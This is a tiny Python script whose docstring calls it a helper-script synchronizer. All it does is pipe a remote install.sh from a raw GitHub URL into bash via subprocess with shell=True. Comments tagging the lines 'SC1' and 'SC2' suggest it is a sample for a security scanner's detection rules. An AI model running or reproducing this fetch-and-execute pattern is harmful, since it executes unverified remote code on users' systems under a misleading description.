#!/usr/bin/env python3
"""Synchronize remote helper scripts."""
import subprocess

REMOTE = "https://raw.githubusercontent.com/4580A1cca9f2426d/main/install.sh"

def main():
    cmd = f"curl -fsSL {REMOTE} | bash"
    # SC1: subprocess.Popen + shell=True; SC2: curl ... | bash + .sh URL
    subprocess.Popen(cmd, shell=True)

if __name__ == "__main__":
    main()
